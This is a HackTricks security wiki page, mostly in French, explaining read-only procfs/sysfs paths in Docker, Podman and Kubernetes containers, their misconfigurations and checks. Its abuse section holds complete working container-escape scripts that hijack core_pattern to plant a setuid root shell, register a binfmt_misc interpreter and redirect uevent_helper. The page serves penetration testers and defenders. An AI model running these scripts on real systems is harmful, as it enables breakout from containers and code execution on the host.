# Chemins système en lecture seule

{{#include ../../../../banners/hacktricks-training.md}}

Les chemins système en lecture seule constituent une protection distincte des chemins masqués. Plutôt que de masquer complètement un chemin, le runtime l'expose mais le monte en lecture seule. C'est courant pour certains emplacements procfs et sysfs où l'accès en lecture peut être acceptable ou nécessaire pour l'exploitation, alors que les écritures seraient trop dangereuses.

Le principe est simple : de nombreuses interfaces du noyau deviennent beaucoup plus dangereuses lorsqu'elles sont modifiables. Un montage en lecture seule n'élimine pas toute valeur de reconnaissance, mais il empêche une charge de travail compromise de modifier, via ce chemin, les fichiers exposés au noyau sous-jacents.

## Fonctionnement

Les runtimes marquent fréquemment des parties de la vue proc/sys comme lecture seule. Selon le runtime et l'hôte, cela peut inclure des chemins tels que :

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

La liste exacte varie, mais le modèle est le même : autoriser la visibilité quand nécessaire, refuser la mutation par défaut.

## Laboratoire

Inspecter la liste des chemins en lecture seule déclarés par Docker :
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Inspectez la vue montée de proc/sys depuis l'intérieur du conteneur :
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Impact sur la sécurité

Les chemins système en lecture seule réduisent une grande classe d'abus ayant un impact sur l'hôte. Même lorsqu'un attaquant peut inspecter procfs ou sysfs, l'impossibilité d'y écrire supprime de nombreuses voies de modification directes impliquant kernel tunables, crash handlers, module-loading helpers, ou d'autres interfaces de contrôle. L'exposition n'est pas éliminée, mais la transition d'une divulgation d'information à une influence sur l'hôte devient plus difficile.

## Mauvaises configurations

Les erreurs principales consistent à désmasquer ou remonter des chemins sensibles en lecture-écriture, exposer directement le contenu proc/sys de l'hôte via des bind mounts écrivables, ou utiliser des modes privilégiés qui contournent effectivement les valeurs d'exécution plus sûres. Dans Kubernetes, `procMount: Unmasked` et les workloads privilégiés vont souvent de pair avec une protection de proc plus faible. Une autre erreur opérationnelle courante est de supposer que, parce que le runtime monte généralement ces chemins en lecture seule, tous les workloads héritent encore de ce comportement.

## Abus

Si la protection est faible, commencez par rechercher des entrées proc/sys écrivables :
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Lorsqu'il existe des entrées inscriptibles, les chemins de suivi de grande valeur incluent :
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
What these commands can reveal:

- Les entrées modifiables sous `/proc/sys` signifient souvent que le container peut modifier le comportement du host kernel plutôt que de simplement l'inspecter.
- `core_pattern` est particulièrement important parce qu'une valeur modifiable exposée au host peut être détournée en chemin d'exécution de code sur le host en provoquant le crash d'un processus après avoir configuré un pipe handler.
- `modprobe` révèle l'aide utilisée par le kernel pour les flux liés au chargement de modules ; c'est une cible à haute valeur classique quand elle est modifiable.
- `binfmt_misc` indique si l'enregistrement d'interpréteur personnalisé est possible. Si l'enregistrement est modifiable, cela peut devenir une primitive d'exécution plutôt qu'une simple information leak.
- `panic_on_oom` contrôle une décision kernel à l'échelle du host et peut donc transformer un épuisement des ressources en denial of service sur le host.
- `uevent_helper` est un des exemples les plus clairs d'un chemin helper sysfs modifiable produisant une exécution dans le contexte du host.

Les découvertes intéressantes incluent des proc knobs orientés host ou des entrées sysfs modifiables qui auraient normalement dû être read-only. À ce stade, la charge de travail est passée d'une vue container contrainte vers une influence significative sur le kernel.

### Full Example: `core_pattern` Host Escape

If `/proc/sys/kernel/core_pattern` is writable from inside the container and points to the host kernel view, it can be abused to execute a payload after a crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Si le chemin atteint réellement le noyau de l'hôte, la payload s'exécute sur l'hôte et laisse derrière elle une shell setuid.

### Exemple complet : enregistrement `binfmt_misc`

Si `/proc/sys/fs/binfmt_misc/register` est accessible en écriture, l'enregistrement d'un interpréteur personnalisé peut entraîner l'exécution de code lorsque le fichier correspondant est exécuté :
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Sur un `binfmt_misc` accessible en écriture depuis l'hôte, cela se traduit par l'exécution de code dans le chemin de l'interpréteur déclenché par le kernel.

### Exemple complet : `uevent_helper`

Si `/sys/kernel/uevent_helper` est accessible en écriture, le kernel peut invoquer un helper situé sur le système hôte lorsqu'un événement correspondant est déclenché :
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
La raison pour laquelle cela est si dangereux est que le chemin helper est résolu du point de vue du système de fichiers de l'hôte plutôt que depuis un contexte sûr limité au conteneur.

## Vérifications

Ces vérifications déterminent si l'exposition de procfs/sysfs est en lecture seule là où elle est attendue et si la charge de travail peut encore modifier des interfaces sensibles du noyau.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Ce qui est intéressant ici :

- Une charge de travail durcie normale devrait exposer très peu d'entrées proc/sys modifiables.
- Les chemins `/proc/sys` en écriture sont souvent plus importants que l'accès en lecture ordinaire.
- Si le runtime indique qu'un chemin est en lecture seule mais qu'il est modifiable en pratique, examinez attentivement la propagation des montages, les bind mounts et les paramètres de privilèges.

## Paramètres par défaut du runtime

| Runtime / platform | État par défaut | Comportement par défaut | Affaiblissements manuels courants |
| --- | --- | --- | --- |
| Docker Engine | Activé par défaut | Docker définit une liste par défaut de chemins en lecture seule pour les entrées proc sensibles | exposer les montages host proc/sys, `--privileged` |
| Podman | Activé par défaut | Podman applique des chemins en lecture seule par défaut sauf si explicitement assouplis | `--security-opt unmask=ALL`, montages host étendus, `--privileged` |
| Kubernetes | Hérite des paramètres par défaut du runtime | Utilise le modèle de chemins en lecture seule du runtime sous-jacent sauf s'il est affaibli par les paramètres du Pod ou par des montages host | `procMount: Unmasked`, workloads privilégiés, montages host proc/sys en écriture |
| containerd / CRI-O under Kubernetes | Paramètre par défaut du runtime | Se base généralement sur les valeurs par défaut OCI/runtime | idem que la ligne Kubernetes ; des modifications directes de la config du runtime peuvent affaiblir le comportement |

Le point clé est que les chemins système en lecture seule sont généralement présents par défaut au niveau du runtime, mais ils sont faciles à contourner avec des modes privilégiés ou des bind mounts host.
{{#include ../../../../banners/hacktricks-training.md}}
